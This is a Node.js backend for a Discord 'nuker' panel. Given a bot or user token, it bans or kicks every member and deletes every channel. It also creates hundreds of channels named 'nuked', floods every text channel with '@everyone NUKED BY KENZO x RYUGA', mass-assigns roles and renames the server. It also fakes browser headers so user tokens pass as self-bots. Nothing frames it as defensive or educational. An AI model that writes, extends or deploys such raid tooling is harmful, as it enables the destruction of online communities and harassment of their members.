const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, '../public')));

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

// Root route - serve the control panel
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Store active bot connections
const botConnections = new Map();

// Discord API helper
const DISCORD_API = 'https://discord.com/api/v10';
const SUPER_PROPS = 'eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoibW9iaWxlIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzKSBBcHBsZVdlYmtpdC81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjAuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTMiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTAwMDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9';

function discordHeaders(token, isBot = false) {
  const useBot = isBot;
  const headers = {
    Authorization: (useBot ? 'Bot ' : '') + token,
    'Content-Type': 'application/json',
  };
  if (!useBot) {
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
  }
  return headers;
}

async function discordRequest(method, path, body, token, isBot = false) {
  const res = await fetch(`${DISCORD_API}${path}`, {
    method,
    headers: discordHeaders(token, isBot),
    body: body ? JSON.stringify(body) : undefined,
  });

  if (res.status === 429) {
    const retry = await res.json();
    await new Promise(r => setTimeout(r, (retry.retry_after || 1) * 1000 + 100));
    return discordRequest(method, path, body, token, isBot);
  }

  if (!res.ok) {
    const text = await res.text();
    const err = new Error(`${res.status} ${text.slice(0, 200)}`);
    err.status = res.status;
    throw err;
  }

  if (res.status === 204) return null;
  return res.json();
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
  console.log('Frontend connected');
  let botWs = null;
  let heartbeatInterval = null;
  let resolved = false;

  const send = (data) => {
    if (ws.readyState === 1) ws.send(JSON.stringify(data));
  };

  const log = (msg) => send({ type: 'LOG', message: msg });

  ws.on('message', async (data) => {
    try {
      const msg = JSON.parse(data);

      if (msg.type === 'CONNECT') {
        const { token, customName } = msg;

        // Validate bot token via REST
        try {
          const me = await discordRequest('GET', '/users/@me', null, token, true);
          log(`✅ Token valid: ${me.username}#${me.discriminator} (${me.id})`);
        } catch (e) {
          log(`❌ Token invalid: ${e.message}`);
          send({ type: 'ERROR', message: e.message });
          return;
        }

        // Connect to Discord gateway
        const gatewayUrl = 'wss://gateway.discord.gg/?v=10&encoding=json';
        log(`Connecting to ${gatewayUrl}`);
        
        botWs = new (require('ws'))(gatewayUrl);
        let heartbeatInterval = null;
        let gatewayResolved = false;
        const timeout = setTimeout(() => {
          if (!gatewayResolved) {
            gatewayResolved = true;
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            log('❌ Gateway timeout (15s)');
            send({ type: 'ERROR', message: 'Gateway connection timeout' });
          }
        }, 15000);

        botWs.on('open', () => log('✅ Gateway connected, waiting for HELLO...'));

        botWs.on('message', async (data) => {
          try {
            const msg = JSON.parse(data);

            if (msg.op === 10) {
              const heartbeat = msg.d.heartbeat_interval;
              log(`✅ HELLO received, heartbeat: ${heartbeat}ms`);

              heartbeatInterval = setInterval(() => {
                if (botWs && botWs.readyState === 1) {
                  botWs.send(JSON.stringify({ op: 1, d: null }));
                }
              }, heartbeat);

              botWs.send(JSON.stringify({
                op: 2,
                d: {
                  token: 'Bot ' + msg.token,
                  intents: 131071,
                  properties: {
                    os: 'Windows',
                    browser: 'Discord',
                    device: 'Web',
                  },
                  compress: false,
                  presence: {
                    status: 'online',
                    since: 0,
                    activities: [{ name: msg.customName, type: 0 }],
                    afk: false,
                  },
                },
              }));
              log('📤 IDENTIFY sent');

            } else if (msg.op === 0 && msg.t === 'READY') {
              log('✅ Bot READY on gateway!');
              if (!gatewayResolved) {
                gatewayResolved = true;
                clearTimeout(timeout);
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                send({ type: 'READY' });
              }
            } else if (msg.op === 9) {
              log('❌ Invalid session (op 9)');
              if (!gatewayResolved) {
                gatewayResolved = true;
                clearTimeout(timeout);
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                send({ type: 'ERROR', message: 'Invalid session - check bot token and ensure bot is in a server' });
              }
            } else if (msg.op === 11) {
              // Heartbeat ACK - silent
            }
          } catch (e) {
            log(`Gateway error: ${e.message}`);
          }
        });

        botWs.on('error', (err) => {
          log(`Gateway error: ${err.message}`);
          if (!gatewayResolved) {
            gatewayResolved = true;
            clearTimeout(timeout);
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            send({ type: 'ERROR', message: err.message });
          }
        });

        botWs.on('close', (code, reason) => {
          log(`Gateway closed: ${code} - ${reason || 'none'}`);
          if (heartbeatInterval) clearInterval(heartbeatInterval);
          if (!gatewayResolved) {
            gatewayResolved = true;
            const errorMsg = 
              code === 4004 ? 'Invalid token' :
              code === 4003 ? 'Disallowed intent - enable in Discord Developer Portal' :
              code === 4005 ? 'Invalid intent' :
              code === 4007 ? 'Invalid sequence' :
              code === 4009 ? 'Invalid session' :
              code === 4011 ? 'Bot not in any server - invite it first' :
              `Connection closed (${code})`;
            send({ type: 'ERROR', message: errorMsg });
          }
        });

        // Store connection for later commands
        botConnections.set(ws, { botWs, customName: msg.customName, token: msg.token });

      } else if (msg.type === 'DISCONNECT') {
        if (botWs) {
          botWs.close();
          botWs = null;
        }
      } else if (msg.type === 'COMMAND') {
        // Forward commands to Discord API via REST
        const conn = botConnections.get(ws);
        if (!conn) {
          send({ type: 'ERROR', message: 'Not connected' });
          return;
        }

        try {
          if (msg.command === 'BAN_ALL') {
            // Fast ban implementation
            log('🔨 BAN ALL started...');
            const me = await discordRequest('GET', '/users/@me', null, conn.token, true);
            const members = await getAllMembers(conn.guildId || msg.guildId, conn.token);
            const targets = members.filter(m => !m.user.bot && m.user.id !== me.id);
            log(`Banning ${targets.length} members...`);
            
            let banned = 0;
            for (const m of targets) {
              try {
                await discordRequest('PUT', `/guilds/${msg.guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, conn.token, true);
                banned++;
                if (banned % 25 === 0) log(`Banned ${banned}/${targets.length}...`);
              } catch (e) {}
            }
            log(`✅ Banned ${banned} members`);
            send({ type: 'LOG', message: `✅ Banned ${banned} members` });
          }
          // Add more commands as needed
        } catch (e) {
          send({ type: 'ERROR', message: e.message });
        }
      }
    } catch (e) {
      log(`Error: ${e.message}`);
      send({ type: 'ERROR', message: e.message });
    }
  });

  ws.on('close', () => {
    botConnections.delete(ws);
    console.log('Frontend disconnected');
  });
});

async function getAllMembers(guildId, token) {
  const out = [];
  let after = '0';
  while (true) {
    const batch = await discordRequest('GET', `/guilds/${guildId}/members?limit=1000&after=${after}`, null, token, true);
    if (!Array.isArray(batch) || batch.length === 0) break;
    out.push(...batch);
    after = batch[batch.length - 1].user.id;
    if (batch.length < 1000) break;
  }
  return out;
}

// ==================== COMMAND JOB API (no CORS - server side) ====================
const jobs = new Map();
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

app.post('/api/command', (req, res) => {
  const { token, isBot, command, guildId, name, count } = req.body || {};

  if (!token || !command || !guildId) {
    return res.status(400).json({ error: 'token, command, guildId required' });
  }
  if (!/^\d{17,20}$/.test(String(guildId))) {
    return res.status(400).json({ error: 'guildId must be 17-20 digits' });
  }

  const channelName = String(name || 'nuked').replace(/[^\w \-#().]/g, '').slice(0, 100) || 'nuked';
  const channelCount = Math.min(Math.max(parseInt(count, 10) || 50, 1), 500);

  const id = 'job_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  const job = { id, command, status: 'running', logs: [], done: 0, failed: 0, started: Date.now() };
  jobs.set(id, job);

  const log = (message, level = 'info') => {
    job.logs.push({ t: Date.now(), message, level });
    if (job.logs.length > 500) job.logs.shift();
  };

  let firstErrorLogged = false;
  const noteError = (e) => {
    job.failed++;
    if (!firstErrorLogged) {
      firstErrorLogged = true;
      log('First failure: ' + (e && e.message ? e.message : e), 'warning');
    }
  };

  (async () => {
    try {
      log('▶ Running ' + command + '...', 'info');
      log('auth=' + (isBot ? 'BOT' : 'USER') + ' isBot=' + isBot + ' tokenLen=' + String(token || '').length + ' name="' + channelName + '" count=' + channelCount, 'info');

      if (command === 'BAN_ALL' || command === 'KICK_ALL') {
        const me = await discordRequest('GET', '/users/@me', null, token, isBot);
        const members = await getAllMembers(guildId, token);
        log('Found ' + members.length + ' members', 'info');

        for (const m of members) {
          if (m.user.id === me.id) continue;
          try {
            if (command === 'BAN_ALL') {
              await discordRequest('PUT', `/guilds/${guildId}/bans/${m.user.id}`, { delete_message_seconds: 0 }, token, isBot);
            } else {
              await discordRequest('DELETE', `/guilds/${guildId}/members/${m.user.id}`, null, token, isBot);
            }
            job.done++;
          } catch (e) { noteError(e); }
          if (job.done % 10 === 0) log(command + ': ' + job.done + ' ok, ' + job.failed + ' failed', 'info');
          await sleep(280);
        }

      } else if (command === 'DELETE_ALL' || command === 'CREATE_CHANNELS' || command === 'SPAM_ALL') {
        const channels = await discordRequest('GET', `/guilds/${guildId}/channels`, null, token, isBot);
        log('Found ' + channels.length + ' channels', 'info');

        if (command === 'DELETE_ALL') {
          for (const c of channels) {
            try { await discordRequest('DELETE', `/channels/${c.id}`, null, token, isBot); job.done++; }
            catch (e) { noteError(e); }
            if (job.done % 10 === 0) log('Deleted ' + job.done + '/' + channels.length, 'info');
            await sleep(280);
          }
        } else if (command === 'CREATE_CHANNELS') {
          log('Creating ' + channelCount + ' channels named "' + channelName + '"', 'info');
          for (let i = 0; i < channelCount; i++) {
            try {
              await discordRequest('POST', `/guilds/${guildId}/channels`, { name: channelName, type: 0 }, token, isBot);
              job.done++;
            } catch (e) { noteError(e); }
            if (job.done % 10 === 0) log('Created ' + job.done + '/' + channelCount, 'info');
            await sleep(300);
          }
        } else {
          for (const c of channels) {
            if (c.type !== 0 && c.type !== 5) continue;
            for (let i = 0; i < 5; i++) {
              try {
                await discordRequest('POST', `/channels/${c.id}/messages`, { content: '@everyone **NUKED BY KENZO x RYUGA**' }, token, isBot);
                job.done++;
              } catch (e) { noteError(e); }
              await sleep(320);
            }
            log('Spammed #' + c.name + ' (' + job.done + ' sent)', 'info');
          }
        }

      } else if (command === 'CLAIM_ROLES') {
        const roles = await discordRequest('GET', `/guilds/${guildId}/roles`, null, token, isBot);
        const me = await discordRequest('GET', '/users/@me', null, token, isBot);
        const self = await discordRequest('GET', `/guilds/${guildId}/members/${me.id}`, null, token, isBot);

        const myTop = (self.roles || [])
          .map(id => roles.find(r => r.id === id))
          .filter(Boolean)
          .reduce((max, r) => Math.max(max, r.position), 0);

        // Discord forbids assigning a role at/above the actor's highest role
        const target = roles
          .filter(r => r.position > 0 && r.position < myTop)
          .sort((a, b) => b.position - a.position)[0];

        if (!target) {
          throw new Error('No assignable role below your highest role (yours: pos ' + myTop + '). Raise the bot role.');
        }

        const members = await getAllMembers(guildId, token);
        log('Claiming "' + target.name + '" (pos ' + target.position + ') on ' + members.length + ' members', 'info');

        for (const m of members) {
          try {
            await discordRequest('PATCH', `/guilds/${guildId}/members/${m.user.id}`, { roles: [target.id, ...(m.roles || [])] }, token, isBot);
            job.done++;
          } catch (e) { noteError(e); }
          await sleep(280);
        }

      } else if (command === 'RENAME_GUILD') {
        const newName = String(name || '').slice(0, 100);
        if (!newName) throw new Error('New name required');
        await discordRequest('PATCH', `/guilds/${guildId}`, { name: newName }, token, isBot);
        job.done = 1;
        log('Renamed server to "' + newName + '"', 'success');
      }

      job.status = 'done';
      log('✅ ' + command + ' finished — ok:' + job.done + ' failed:' + job.failed, 'success');
    } catch (e) {
      job.status = 'error';
      log('❌ ' + command + ' failed: ' + e.message, 'error');
    }
  })();

  res.json({ jobId: id });
});

app.get('/api/job/:id', (req, res) => {
  const job = jobs.get(req.params.id);
  if (!job) return res.status(404).json({ error: 'job not found' });
  res.json(job);
});

// prune old jobs
setInterval(() => {
  const cutoff = Date.now() - 10 * 60 * 1000;
  for (const [k, v] of jobs) if (v.started < cutoff) jobs.delete(k);
}, 60000).unref();

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
});